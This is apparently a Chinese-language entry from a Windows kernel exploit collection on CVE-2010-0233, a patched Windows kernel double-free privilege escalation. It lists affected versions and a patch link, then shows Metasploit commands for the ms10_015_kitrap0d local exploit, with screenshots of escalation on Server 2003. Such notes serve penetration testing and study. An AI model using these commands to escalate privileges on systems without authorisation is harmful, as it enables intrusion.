### CVE-2010-0233

#### 描述

Double free vulnerability in the kernel in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP2, Vista Gold, SP1, and SP2, and Server 2008 Gold and SP2 allows local users to gain privileges via a crafted application, aka "Windows Kernel Double Free Vulnerability."

#### 影响版本

| Product             | Version | Update | Edition | Tested |
| ------------------- | ------- | ------ | ------- | ------ |
| Windows 2000        | SP4     |        |         |        |
| Windows Server 2003 |         | SP2    |         |        |
| Windows Server 2008 | -       | SP2    | Itanium |        |
| Windows Server 2008 |         | SP2    | X64     |        |
| Windows Server 2008 |         |        | Itanium |        |
| Windows Server 2008 |         |        | X32     |        |
| Windows Server 2008 |         |        | X64     |        |
| Windows Server 2008 | SP2     | X32    |         |        |
| Windows Vista       |         |        |         |        |
| Windows Vista       | SP1     |        |         |        |
| Windows Vista       | SP2     |        |         |        |
| Windows Xp          | -       |        |         |        |
| Windows Xp          | SP3     |        |         |        |

#### 修复补丁

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2010-0233
```

#### 利用方式

编译环境

- nmake 2013

测试系统windows server 2003 sp2 x86

![25](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2010-0233_win2003_x86.gif?raw=true)

> msf利用

测试系统windows server 2003 sp2 x86，执行以下代码

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 3
run
```

可以看到当前权限是最低的

![image-20200823123824229](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2010-0233_win2003_x86_msf.png?raw=true)

然后执行命令提权

![image-20200823123945054](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2010-0233_win2003_x86_msf2.png?raw=true)